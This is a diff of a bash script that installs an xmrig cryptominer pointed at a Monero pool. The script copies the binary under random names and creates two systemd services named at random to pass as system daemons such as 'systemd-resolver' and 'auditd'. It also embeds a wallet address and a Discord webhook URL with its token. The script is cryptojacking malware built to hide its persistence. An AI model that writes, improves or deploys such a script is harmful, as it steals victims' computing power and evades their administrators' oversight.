@@ -10,7 +10,6 @@ POOL="pool.hashvault.pro:443"
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os"
 
 
-KEY="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
 WORKER1="core_$(hostname)"
 WORKER2="silent_$(hostname)"
 TOTAL_CORES=$(nproc)
@@ -25,6 +24,7 @@ SERVICE1=$(shuf -n1 -e "systemd-resolver" "kernel-log" "net-fix")
 SERVICE2=$(shuf -n1 -e "auditd" "modprobe-sync" "xinetd")
 LOG1="/tmp/xmrig-log1.log"
 LOG2="/tmp/xmrig-log2.log"
+KEY="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
 
 
 
@@ -46,10 +46,12 @@ cp ./xmrig "$DIR1/$NAME1"
 cp ./xmrig "$DIR2/$NAME2"
 chmod +x "$DIR1/$NAME1" "$DIR2/$NAME2"
 
-# Tạo systemd cho tiến trình 1
+# Tạo systemd cho tiến trình
+
+
 sudo tee /etc/systemd/system/$SERVICE1.service > /dev/null << EOF
 [Unit]
-Description=Core Miner Daemon 1
+Description=Core Miner Fallback
 After=network.target
 
 [Service]
@@ -62,11 +64,9 @@ Nice=10
 [Install]
 WantedBy=multi-user.target
 EOF
-
-# Tạo systemd cho tiến trình 2
 sudo tee /etc/systemd/system/$SERVICE2.service > /dev/null << EOF
 [Unit]
-Description=Core Miner Daemon 2
+Description=Core Miner
 After=network.target
 
 [Service]
